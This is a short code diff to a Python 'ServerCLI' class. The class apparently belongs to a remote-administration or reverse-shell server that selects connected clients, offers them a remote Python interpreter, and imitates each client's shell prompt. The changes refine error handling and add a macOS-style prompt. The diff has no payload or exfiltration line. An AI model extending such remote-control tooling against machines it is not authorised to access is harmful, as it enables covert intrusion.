@@ -80,10 +80,10 @@ class ServerCLI(Server):
         try:
             client = self.clients[int(target)]
         except (ValueError, IndexError):
-            logging.error('Not a valid selection')
-            return
-        print(f"You are now connected to {client.address[2]}")
-        return client
+            logging.error('"%s" Not a valid selection' % target)
+        else:
+            print(f"You are now connected to {client.address[2]}")
+            return client
 
     def python_interpreter(self, client: Client) -> None:
         """ Remote Python Interpreter CLI"""
@@ -109,11 +109,19 @@ class ServerCLI(Server):
 
         while True:
             cwd = client.get_cwd()
-            if not system == 'Windows':
+            if system == 'Windows':
+                _input = f'{cwd}>'
+            elif system == 'Darwin':
+                if cwd == home:
+                    folder = '~'
+                elif cwd == '/':
+                    folder = cwd
+                else:
+                    folder = cwd.split(os.sep)[-1]
+                _input = f'{user}@{hostname} {folder} %'
+            else:
                 cwd = cwd.replace(home, '~')
                 _input = f'{user}@{hostname}:{cwd}$ '
-            else:
-                _input = f'{cwd}>'
 
             command = input(_input)
             if command.strip() == '':
